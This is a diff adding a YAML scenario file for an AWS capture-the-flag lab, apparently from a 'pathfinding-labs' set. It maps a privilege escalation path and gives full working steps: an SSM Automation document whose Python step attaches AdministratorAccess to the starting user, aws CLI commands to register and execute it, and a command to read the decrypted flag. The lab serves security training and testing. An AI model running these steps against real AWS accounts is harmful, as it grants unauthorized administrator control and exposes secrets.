@@ -1,0 +1,127 @@
+attackMap:
+  nodes:
+    - id: starting-user
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-ssm-003-to-admin-starting-user"
+      access:
+        type: assumed-breach-credentials
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could have been
+        obtained through many real-world vectors: phishing a developer and gaining access to their
+        workstation, compromising a browser session, exploiting a vulnerable workload running in
+        this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded
+        in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user holds three permissions that together form a complete privilege escalation
+        path: iam:PassRole scoped to the SSM Automation role, ssm:CreateDocument, and
+        ssm:StartAutomationExecution. No EC2 instance, no SSM agent, and no pre-existing compute
+        resource is required to exploit this combination.
+
+    - id: automation-role
+      label: "Automation Role"
+      type: principal
+      subType: iam-role
+      isAdmin: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-ssm-003-to-admin-automation-role"
+      description: >
+        This IAM role is trusted by ssm.amazonaws.com and holds AdministratorAccess. It is
+        designed to serve as the AutomationAssumeRole for SSM Automation executions. When the
+        starting user passes this role into an ssm:StartAutomationExecution call, SSM assumes
+        it and runs the aws:executeScript Python step under its full administrator credentials.
+        The Python script uses the boto3 IAM client — automatically initialized with the role's
+        session — to call iam:AttachUserPolicy, attaching AdministratorAccess to the starting user.
+        After the execution completes, the starting user's original credentials carry full
+        administrator access without any role assumption required.
+
+    - id: ctf-flag
+      label: "CTF Flag"
+      type: resource
+      subType: ssm-parameter
+      isTarget: true
+      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/ssm-003-to-admin"
+      description: >
+        The CTF flag for this scenario, stored as a SecureString in AWS Systems Manager Parameter
+        Store. Retrieving it requires ssm:GetParameter on this specific parameter, which the
+        AdministratorAccess managed policy provides implicitly. Your goal is to read this
+        parameter's value using the original starting user credentials — which now carry
+        AdministratorAccess after the automation execution completed.
+
+  edges:
+    - from: starting-user
+      to: automation-role
+      label: "iam:PassRole + ssm:CreateDocument + ssm:StartAutomationExecution"
+      description: >
+        The starting user creates a custom SSM Automation document (schemaVersion 0.3) containing
+        a single aws:executeScript step. The step's Python script calls iam:AttachUserPolicy to
+        attach AdministratorAccess to the starting user's own username. The user then starts an
+        automation execution, passing the admin role ARN as the AutomationAssumeRole parameter.
+        SSM performs the iam:PassRole check at execution start time — verifying the calling principal
+        can pass the specified role to ssm.amazonaws.com — then assumes the role and runs the
+        Python script inside AWS-managed serverless compute. The boto3 IAM client in the script
+        automatically inherits the assumed role's credentials, so iam:AttachUserPolicy succeeds
+        with full admin authority. The starting user never assumes the role directly; SSM does
+        it on their behalf.
+      hints:
+        - "Create a schemaVersion 0.3 SSM Automation document with a single aws:executeScript step. The Python script receives InputPayload parameters and runs with the AutomationAssumeRole's boto3 session — use boto3.client('iam') directly without any credential setup."
+        - "Pass the admin role ARN as AutomationAssumeRole and your own username as a parameter when calling ssm:StartAutomationExecution. The iam:PassRole check happens at execution start, not at document creation — you only need PassRole scoped to ssm.amazonaws.com."
+        - "Browse to https://pathfinding.cloud/paths/ssm-003 for technique details."
+      commands:
+        - description: "Write the SSM Automation document JSON to a temp file"
+          command: |
+            cat > /tmp/ssm-003-doc.json << 'EOF'
+            {
+              "schemaVersion": "0.3",
+              "description": "Escalate IAM user via aws:executeScript under AutomationAssumeRole",
+              "assumeRole": "{{ AutomationAssumeRole }}",
+              "parameters": {
+                "AutomationAssumeRole": {
+                  "type": "String",
+                  "description": "IAM role ARN for Automation to assume"
+                },
+                "UserName": {
+                  "type": "String",
+                  "description": "IAM user name to escalate"
+                }
+              },
+              "mainSteps": [
+                {
+                  "name": "escalateUser",
+                  "action": "aws:executeScript",
+                  "inputs": {
+                    "Runtime": "python3.11",
+                    "Handler": "script_handler",
+                    "InputPayload": {
+                      "UserName": "{{ UserName }}"
+                    },
+                    "Script": "import boto3\ndef script_handler(events, context):\n    iam = boto3.client('iam')\n    iam.attach_user_policy(UserName=events['UserName'], PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')\n    return {'Status': 'Escalated ' + events['UserName']}\n"
+                  }
+                }
+              ]
+            }
+            EOF
+        - description: "Register the custom SSM Automation document"
+          command: "aws ssm create-document --name pl-escalation-ssm-003 --content file:///tmp/ssm-003-doc.json --document-type Automation --document-format JSON"
+        - description: "Start the automation execution, passing the admin role as AutomationAssumeRole"
+          command: "aws ssm start-automation-execution --document-name pl-escalation-ssm-003 --parameters '{\"AutomationAssumeRole\":[\"arn:aws:iam::{account_id}:role/pl-prod-ssm-003-to-admin-automation-role\"],\"UserName\":[\"pl-prod-ssm-003-to-admin-starting-user\"]}'"
+        - description: "Poll for execution completion (requires ssm:GetAutomationExecution — helpful permission)"
+          command: "aws ssm get-automation-execution --automation-execution-id <execution-id> --query 'AutomationExecution.AutomationExecutionStatus' --output text"
+        - description: "Wait for IAM policy propagation, then verify AdministratorAccess is attached"
+          command: "sleep 15 && aws iam list-attached-user-policies --user-name pl-prod-ssm-003-to-admin-starting-user"
+
+    - from: automation-role
+      to: ctf-flag
+      label: "Read CTF flag"
+      description: >
+        After the automation execution completes, the starting user's original credentials now
+        carry AdministratorAccess — attached by the Python script running under the automation
+        role. No role assumption is needed: the same access key and secret key the attacker
+        started with now permit ssm:GetParameter on any parameter in the account, including
+        the CTF flag. Read the flag directly using the starting user credentials.
+      hints:
+        - "You now hold admin-equivalent credentials via your original starting user keys. The flag is stored in SSM Parameter Store under a predictable path. Use ssm:GetParameter with --with-decryption to read SecureString parameters."
+      commands:
+        - description: "Retrieve the CTF flag using the (now-escalated) starting user credentials"
+          command: "aws ssm get-parameter --name /pathfinding-labs/flags/ssm-003-to-admin --with-decryption --query 'Parameter.Value' --output text"
